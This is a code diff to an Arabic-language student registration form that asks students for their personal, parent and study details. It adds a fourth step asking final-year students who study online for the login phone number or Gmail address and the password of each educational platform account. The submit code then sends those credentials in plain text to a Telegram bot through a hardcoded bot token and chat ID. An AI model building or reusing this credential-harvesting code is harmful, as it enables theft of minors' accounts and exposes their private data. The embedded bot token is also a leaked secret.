@@ -234,6 +234,45 @@
             color: #10b981;
             margin-bottom: 15px;
         }
+
+        /* تنسيق كروت المنصات المكررة */
+        .platform-card {
+            background: #fff;
+            border: 2px dashed #edf2f7;
+            padding: 20px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            position: relative;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        .btn-add-platform {
+            background-color: #fef3c7;
+            color: #d97706;
+            border: 2px dashed #f5c400;
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            margin-bottom: 15px;
+            border-radius: 12px;
+        }
+        .btn-add-platform:hover {
+            background-color: #fde68a;
+        }
+
+        .btn-remove-platform {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: #fee2e2;
+            color: #ef4444;
+            padding: 4px 10px;
+            font-size: 12px;
+            border-radius: 6px;
+        }
+        .btn-remove-platform:hover {
+            background: #fca5a5;
+        }
     </style>
 </head>
 <body>
@@ -333,7 +372,7 @@
                 <div id="seniorThreeQuestions" style="display: none;">
                     <div class="form-group">
                         <label for="lessonSystem">نظام دروسك إيه؟</label>
-                        <select id="lessonSystem" class="input-field">
+                        <select id="lessonSystem" class="input-field" onchange="updateSubmitButtonText()">
                             <option value="">اختر نظام دروسك</option>
                             <option value="سنتر">سنتر</option>
                             <option value="اونلاين وسنتر">اونلاين وسنتر</option>
@@ -389,13 +428,43 @@
 
                 <div class="form-group">
                     <label for="message">يا <span class="dynamic-name">بطل</span>، ما هي أكبر مشكلة تواجهك في الدراسة حالياً؟ (اختياري)</label>
-                    <textarea id="message" class="input-field" style="height: 140px; resize: none;" placeholder="اكتب بالتفصيل لنتمكن من مساعدتك، أو يمكنك تخطي هذا السؤال لإرسال الاستمارة مباشرة..." oninput="checkMessageLength()"></textarea>
+                    <textarea id="message" class="input-field" style="height: 140px; resize: none;" placeholder="اكتب بالتفصيل لنتمكن من مساعدتك، أو يمكنك تخطي هذا السؤال للخطوة التالية..." oninput="checkMessageLength()"></textarea>
                     <div class="char-counter" id="charCounter">0 / 1000 حرف</div>
                 </div>
 
                 <div class="btn-container split-btns">
                     <button type="button" class="btn-prev" onclick="prevStep()">السابق</button>
-                    <button type="button" class="btn-next" id="submitBtn" onclick="submitForm()">إرسال الاستمارة</button>
+                    <button type="button" class="btn-next" id="submitBtn" onclick="handleStepThreeNext()">إرسال الاستمارة</button>
+                </div>
+            </div>
+
+            <div class="form-step" data-step="4" id="stepPlatforms">
+                <div style="text-align: center;">
+                    <div class="section-badge" style="background-color: #e0f2fe; color: #0369a1;">الجزء الرابع: بيانات المنصات التعليمية الأونلاين</div>
+                </div>
+
+                <div id="platformsContainer">
+                    <div class="platform-card">
+                        <div class="form-group">
+                            <label>المادة الدراسية:</label>
+                            <input type="text" class="input-field platform-subject" placeholder="مثال: فيزياء، لغة عربية..." required>
+                        </div>
+                        <div class="form-group">
+                            <label>الرقم أو الجيميل (المسجل به في المنصة):</label>
+                            <input type="text" class="input-field platform-user" placeholder="اكتب الحساب أو الرقم المستخدم هنا" required>
+                        </div>
+                        <div class="form-group">
+                            <label>كلمة المرور (الباسورد):</label>
+                            <input type="text" class="input-field platform-pass" placeholder="اكتب الباسورد الخاص بالمنصة هنا" required>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="button" class="btn-add-platform" onclick="addPlatformField()">+ إضافة مادة أونلاين أخرى</button>
+
+                <div class="btn-container split-btns">
+                    <button type="button" class="btn-prev" onclick="prevStep()">السابق</button>
+                    <button type="button" class="btn-next" id="finalSubmitBtn" onclick="submitForm()">إرسال الاستمارة بالكامل</button>
                 </div>
             </div>
 
@@ -412,7 +481,10 @@
 
     <script>
         let currentStep = 0;
-        const formSteps = document.querySelectorAll('.form-step');
+        // جلب خطوات النموذج ديناميكياً
+        function getSteps() {
+            return document.querySelectorAll('.form-step');
+        }
         const bgPattern = document.getElementById('bgPattern');
 
         // تأثير الماوس الجمالي على الخلفية
@@ -428,6 +500,23 @@
             document.querySelectorAll('.dynamic-name').forEach(el => {
                 el.innerText = firstName;
             });
+        }
+
+        // تحديد ما إذا كان الطالب يستحق الانتقال للجزء الرابع
+        function isEligibleForPlatforms() {
+            const grade = document.getElementById('grade').value;
+            const lessonSystem = document.getElementById('lessonSystem').value;
+            return (grade === "3" && (lessonSystem === "اونلاين فقط" || lessonSystem === "اونلاين وسنتر"));
+        }
+
+        // تحديث نص زر الإرسال في الجزء الثالث بناءً على الشرط
+        function updateSubmitButtonText() {
+            const submitBtn = document.getElementById('submitBtn');
+            if (isEligibleForPlatforms()) {
+                submitBtn.innerText = "التالي (بيانات المنصات)";
+            } else {
+                submitBtn.innerText = "إرسال الاستمارة";
+            }
         }
 
         // التعامل الذكي مع الشعبة والأسئلة الخاصة بتالتة ثانوي
@@ -490,17 +579,20 @@
                 lessonSystem.value = "";
                 onlineLessonsCount.value = "";
             }
+            updateSubmitButtonText();
         }
 
         function showStep(stepIndex) {
-            formSteps.forEach((step, index) => {
+            const steps = getSteps();
+            steps.forEach((step, index) => {
                 step.classList.toggle('active', index === stepIndex);
             });
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function nextStep() {
-            const currentStepEl = formSteps[currentStep];
+            const steps = getSteps();
+            const currentStepEl = steps[currentStep];
             const inputs = currentStepEl.querySelectorAll('input, select, textarea');
             
             let allValid = true;
@@ -511,7 +603,7 @@
                 }
             });
 
-            if (allValid && currentStep < formSteps.length - 1) {
+            if (allValid && currentStep < steps.length - 1) {
                 currentStep++;
                 showStep(currentStep);
             }
@@ -519,9 +611,55 @@
 
         function prevStep() {
             if (currentStep > 0) {
+                // إذا كنا في صفحة النجاح أو راجعين من المنصات
                 currentStep--;
                 showStep(currentStep);
             }
+        }
+
+        // التعامل مع زر الخطوة الثالثة (إرسال مباشر أو انتقال للجزء الرابع)
+        function handleStepThreeNext() {
+            const steps = getSteps();
+            const currentStepEl = steps[currentStep];
+            const textarea = currentStepEl.querySelector('textarea');
+
+            if (!textarea.checkValidity()) {
+                textarea.reportValidity();
+                return;
+            }
+
+            if (isEligibleForPlatforms()) {
+                // تفعيل متطلبات مدخلات الجزء الرابع
+                document.querySelectorAll('#stepPlatforms input').forEach(input => input.setAttribute('required', 'required'));
+                currentStep++;
+                showStep(currentStep);
+            } else {
+                // إرسال مباشر للاستمارة بدون الجزء الرابع
+                submitForm();
+            }
+        }
+
+        // وظيفة إضافة حقول مادة جديدة ديناميكياً (+)
+        function addPlatformField() {
+            const container = document.getElementById('platformsContainer');
+            const card = document.createElement('div');
+            card.className = 'platform-card';
+            card.innerHTML = `
+                <button type="button" class="btn-remove-platform" onclick="this.parentElement.remove()">حذف</button>
+                <div class="form-group">
+                    <label>المادة الدراسية:</label>
+                    <input type="text" class="input-field platform-subject" placeholder="مثال: فيزياء، لغة عربية..." required>
+                </div>
+                <div class="form-group">
+                    <label>الرقم أو الجيميل (المسجل به في المنصة):</label>
+                    <input type="text" class="input-field platform-user" placeholder="اكتب الحساب أو الرقم المستخدم هنا" required>
+                </div>
+                <div class="form-group">
+                    <label>كلمة المرور (الباسورد):</label>
+                    <input type="text" class="input-field platform-pass" placeholder="اكتب الباسورد الخاص بالمنصة هنا" required>
+                </div>
+            `;
+            container.appendChild(card);
         }
 
         function checkMessageLength() {
@@ -531,16 +669,14 @@
             const currentLength = msgInput.value.length;
 
             if (currentLength === 0) {
-                counterEl.innerText = `0 / 1000 حرف (يمكنك الإرسال مباشرة أو تخطي السؤال)`;
+                counterEl.innerText = `0 / 1000 حرف (يمكنك الانتقال أو تخطي السؤال)`;
                 counterEl.classList.remove('valid', 'invalid');
                 submitBtn.disabled = false; 
-                submitBtn.innerText = "إرسال الاستمارة";
             } else if (currentLength > 0 && currentLength <= 1000) {
-                counterEl.innerText = `${currentLength} / 1000 حرف (مسموح بالإرسال)`;
+                counterEl.innerText = `${currentLength} / 1000 حرف (مسموح بالتقدم)`;
                 counterEl.classList.add('valid');
                 counterEl.classList.remove('invalid');
                 submitBtn.disabled = false; 
-                submitBtn.innerText = "إرسال الاستمارة";
             } else if (currentLength > 1000) {
                 counterEl.innerText = `${currentLength} / 1000 حرف (تخطيت الحد الأقصى بـ ${currentLength - 1000} حرف)`;
                 counterEl.classList.remove('valid');
@@ -558,15 +694,30 @@
         }
 
         async function submitForm() {
+            // التحقق من صحة حقول الخطوة الحالية إذا كانت خطوة المنصات مفتوحة
+            if (isEligibleForPlatforms() && currentStep === 3) {
+                const currentStepEl = getSteps()[currentStep];
+                const inputs = currentStepEl.querySelectorAll('input');
+                let allValid = true;
+                inputs.forEach(input => {
+                    if (!input.checkValidity()) {
+                        input.reportValidity();
+                        allValid = false;
+                    }
+                });
+                if (!allValid) return;
+            }
+
             const messageInput = document.getElementById('message');
             const submitBtn = document.getElementById('submitBtn');
+            const finalSubmitBtn = document.getElementById('finalSubmitBtn');
             
             if (messageInput.value.length > 1000) return;
 
             const fullName = escapeHTML(document.getElementById('fullName').value);
             const phone = escapeHTML(document.getElementById('phone').value);
             
-            // تجميع تاريخ الميلاد من المربعات الثلاثة
+            // تجميع تاريخ الميلاد
             const bDay = document.getElementById('birthDay').value;
             const bMonth = document.getElementById('birthMonth').value;
             const bYear = document.getElementById('birthYear').value;
@@ -602,8 +753,27 @@
 --------------------------------------`;
             }
 
+            // تجميع بيانات المنصات إذا كانت متوفرة
+            let platformsDetailsTelegram = "";
+            if (isEligibleForPlatforms()) {
+                platformsDetailsTelegram = `\n<b>🔐 [بيانات الحسابات والمنصات التعليمية]</b>\n`;
+                const subjects = document.querySelectorAll('.platform-subject');
+                const users = document.querySelectorAll('.platform-user');
+                const passwords = document.querySelectorAll('.platform-pass');
+
+                subjects.forEach((sub, index) => {
+                    platformsDetailsTelegram += `
+<b>📖 المادة (${index + 1}):</b> ${escapeHTML(sub.value)}
+<b>👤 الحساب/الجيميل:</b> <code>${escapeHTML(users[index].value)}</code>
+<b>🔑 الباسورد:</b> <code>${escapeHTML(passwords[index].value)}</code>
+--------------------------------------`;
+                });
+            }
+
+            // إيقاف الأزرار لمنع التكرار
             submitBtn.disabled = true;
-            submitBtn.innerText = "جاري الإرسال...";
+            finalSubmitBtn.disabled = true;
+            finalSubmitBtn.innerText = "جاري الإرسال...";
 
             const botToken1 = "8773946609:AAFcj135q22j-92ICGnwJJKKrn3RXaIO30c";
             const chatId1 = "8244352245";
@@ -623,7 +793,7 @@
 <b>🎓 السنة الدراسية:</b> ${gradeText}
 <b>🏛️ نوع التعليم:</b> ثانوية ${eduType}
 <b>🧬 الشعبة:</b> ${section}
---------------------------------------${seniorThreeTelegramDetails}
+--------------------------------------${seniorThreeTelegramDetails}${platformsDetailsTelegram}
 
 <b>👨‍👩‍👦 [بيانات ولي الأمر]</b>
 <b>👤 اسم ولي الأمر:</b> ${parentName}
@@ -662,14 +832,16 @@ ${message}
                 }
 
                 document.getElementById('studentName').innerText = fullName.split(' ')[0];
-                currentStep = formSteps.length - 1; 
+                const steps = getSteps();
+                currentStep = steps.length - 1; // الانتقال لصفحة النجاح الأخيرة دائماً
                 showStep(currentStep);
 
             } catch (error) {
                 console.error("خطأ أثناء الإرسال:", error);
                 alert("عذرًا، حدث خطأ أثناء إرسال البيانات. يرجى التحقق من اتصال الإنترنت والمحاولة مرة أخرى.");
                 submitBtn.disabled = false;
-                submitBtn.innerText = "إرسال الاستمارة";
+                finalSubmitBtn.disabled = false;
+                finalSubmitBtn.innerText = "إرسال الاستمارة بالكامل";
             }
         }
 
